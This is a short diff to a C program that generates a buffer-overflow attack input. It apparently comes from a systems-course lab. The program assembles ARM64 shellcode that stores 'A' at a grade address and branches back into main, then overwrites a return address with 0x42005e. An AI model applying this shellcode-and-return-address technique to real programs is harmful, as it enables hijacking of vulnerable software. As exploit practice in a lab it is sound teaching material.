@@ -36,8 +36,8 @@ int main(void) {
     /* instruction 3: strb w1, [x0] (store 'A' at grade) */
     instr3 = MiniAssembler_strb(1, 0);
     
-    /* Instruction 4: b 0x4008a0 (branch to grade loading instead) */
-    instr4 = MiniAssembler_b(0x4008a0, 0x42006a);
+    /* instruction 4: b 0x40089c (branch back to main+64) */
+    instr4 = MiniAssembler_b(0x40089c, 0x42006a);
     
     /* write shellcode bytes (instructions 1-4, 16 bytes total) */
     bytes = (unsigned char *)&instr1;
@@ -68,6 +68,9 @@ int main(void) {
     /* target address 0x42005e in little-endian */
     shellcode_addr = 0x42005e;
     fwrite(&shellcode_addr, sizeof(shellcode_addr), 1, fp);
+    
+    /* Write final newline to terminate input properly */
+    fputc('\n', fp);
     
     fclose(fp);
     return 0;
